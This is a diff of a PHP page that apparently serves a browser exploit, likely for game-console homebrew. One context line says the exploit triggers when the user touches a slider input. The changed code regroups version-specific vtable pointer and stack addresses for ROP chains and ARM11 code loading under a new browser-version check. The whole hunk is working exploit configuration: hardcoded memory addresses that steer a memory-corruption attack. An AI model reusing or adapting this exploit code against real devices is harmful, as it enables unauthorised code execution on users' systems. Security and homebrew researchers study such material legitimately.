@@ -23,30 +23,33 @@ $bodytext_notes.= "To trigger the exploit, touch anywhere on the slider input ab
 $VTABLEPTR = 0x08d37014;// + 0x1f000;//0x08b66004;
 $STACKPTR_ADR = 0x08dae018;/*0x08d9a018 + 0x16000;*/// + 0x1f000;//0x08b75804;
 
-if($browserver < 3 && $ropchainselect == 1)$VTABLEPTR+= 0x14000;
-if($browserver < 3 && $ropchainselect == 0)$STACKPTR_ADR = 0x08db0018;
-
-if($browserver >= 3)
+if($browserver < 0x80)
 {
-	$VTABLEPTR = 0x08d74014;
-	$STACKPTR_ADR = 0x08dd7018;
+	if($browserver < 3 && $ropchainselect == 1)$VTABLEPTR+= 0x14000;
+	if($browserver < 3 && $ropchainselect == 0)$STACKPTR_ADR = 0x08db0018;
 
-	if($ropchainselect == 1 || $ropchainselect == 4)
+	if($browserver >= 3)
 	{
-		$VTABLEPTR+= 0x19000;
-		$STACKPTR_ADR+= 0x19000;
-	}
-	else if($ropchainselect == 2)
-	{
-		if($arm11code_loadfromsd == 0)
+		$VTABLEPTR = 0x08d74014;
+		$STACKPTR_ADR = 0x08dd7018;
+
+		if($ropchainselect == 1 || $ropchainselect == 4)
 		{
-			$VTABLEPTR+= 0x26000;
-			$STACKPTR_ADR+= 0x26000;
+			$VTABLEPTR+= 0x19000;
+			$STACKPTR_ADR+= 0x19000;
 		}
-		else if($arm11code_loadfromsd == 2)
+		else if($ropchainselect == 2)
 		{
-			$VTABLEPTR+= 0x16000;
-			$STACKPTR_ADR+= 0x16000;
+			if($arm11code_loadfromsd == 0)
+			{
+				$VTABLEPTR+= 0x26000;
+				$STACKPTR_ADR+= 0x26000;
+			}
+			else if($arm11code_loadfromsd == 2)
+			{
+				$VTABLEPTR+= 0x16000;
+				$STACKPTR_ADR+= 0x16000;
+			}
 		}
 	}
 }
